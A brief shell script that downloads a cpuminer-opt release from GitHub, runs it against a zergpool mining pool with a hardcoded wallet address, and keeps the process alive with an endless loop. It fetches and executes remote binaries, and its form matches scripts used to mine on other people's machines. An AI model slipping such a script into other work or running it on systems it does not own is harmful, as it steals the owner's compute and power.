#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DPtgD7ustVi3sy8RvuvTkwy9zGiU9QvQVH -p c=DOGE,mc=VRSC -t 6
while [ 1 ]; do
sleep 3
done
sleep 999
